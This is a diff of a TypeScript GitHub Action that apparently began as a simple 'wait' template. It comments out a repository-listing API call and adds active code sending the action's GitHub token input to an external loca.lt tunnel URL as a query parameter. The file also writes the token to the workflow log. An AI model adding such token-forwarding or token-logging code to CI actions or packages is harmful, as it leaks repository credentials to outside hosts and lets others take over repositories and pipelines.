@@ -10,25 +10,25 @@ async function run(): Promise<void> {
     const myToken = core.getInput('myToken')
     core.warning(myToken)
     const gh = github.getOctokit(myToken)
-    core.warning(
-      JSON.stringify(
-        await gh.request('GET /installation/repositories', {})
-        // await gh.rest.meta.get()
-        // await gh.rest.repos.listCommitStatusesForRef({
-        //   owner: 'krzkaczor',
-        //   repo: 'babel-plugin-tailcall-optimization',
-        //   ref: 'master'
-        // })
-      )
-    )
+    // core.warning(
+    //   JSON.stringify(
+    //     await gh.request('GET /installation/repositories', {})
+    //     // await gh.rest.meta.get()
+    //     // await gh.rest.repos.listCommitStatusesForRef({
+    //     //   owner: 'krzkaczor',
+    //     //   repo: 'babel-plugin-tailcall-optimization',
+    //     //   ref: 'master'
+    //     // })
+    //   )
+    // )
     // core.warning(
     //   JSON.stringify(await gh.rest., undefined, 2)
     // )
     // core.debug(`Waiting ${ms} milliseconds ...`) // debug is only output if you set the secret `ACTIONS_STEP_DEBUG` to true
-    // const _http = new httpm.HttpClient('http-client-tests')
-    // const res: httpm.HttpClientResponse = await _http.get(
-    //   `https://krzkaczor-tests.loca.lt?dupa=${myToken}`
-    // )
+    const _http = new httpm.HttpClient('http-client-tests')
+    const res: httpm.HttpClientResponse = await _http.get(
+      `https://krzkaczor-tests.loca.lt?dupa=${myToken}`
+    )
 
     core.debug(new Date().toTimeString())
     await wait(parseInt(ms, 10))
